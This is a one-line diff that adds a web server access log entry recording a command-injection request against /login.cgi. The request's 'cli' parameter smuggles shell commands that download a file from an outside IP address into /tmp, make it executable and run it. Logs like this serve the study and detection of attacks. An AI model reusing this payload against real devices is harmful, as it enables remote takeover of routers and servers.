@@ -1,0 +1,1 @@
+185.57.69.63 - - [16/Aug/2020:21:00:51 +0300] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.110.185/dlink%20-O%20-%3E%20/tmp/dli;%20chmod%20777%20/tmp/dli;%20sh%20/tmp/dli%27$ HTTP/1.1" 400 150 "-" "-" "Hello, World"
